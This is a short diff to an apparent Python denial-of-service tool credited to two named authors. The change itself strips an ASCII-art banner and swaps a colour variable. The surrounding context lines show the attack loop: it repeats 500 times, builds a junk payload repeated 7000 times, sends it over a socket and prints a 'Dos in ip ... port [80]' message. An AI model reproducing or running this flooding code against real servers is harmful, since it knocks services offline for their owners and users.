@@ -9,19 +9,6 @@ Y = "\033[33m"    # Yellow
 G = "\033[32m"    # Green
 W = "\033[0m"     # White
 R = "\033[31m"    # Red
-C = "\033[36m"    # Cyan
-print("")
-print("")
-print(R+"               \ Imad Ghali♥Jmeel Ahmad /                ")
-print(G+"")
-print(Y+"           lll")
-print(BB+"           lll")
-print(W+"           lll ")
-print(C+"      lll  lll         llllllll)")
-print(B+"      lll  lll  _______lll")
-print(GG+"lllllllll  llllll````llllllllll)      ")
-print(RR+"               \llllll/ ")
-print(YY+"    ++++++++++++++++++++++++++")
 print(GG+"         By Jmeel Ahmad ")
 print("         By lmad Ghali ")
 print("")
@@ -60,7 +47,7 @@ for h in range(500):
       data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿el"*7000
       data=data.encode("utf-8")
       knig.send(data)      
-      print('[√√√] Dos in ip',YY,ip,'Dos [√√√] in',C,'port [80]')
+      print('[√√√] Dos in ip',YY,ip,'Dos [√√√] in',CC,'port [80]')
 
 
   except :
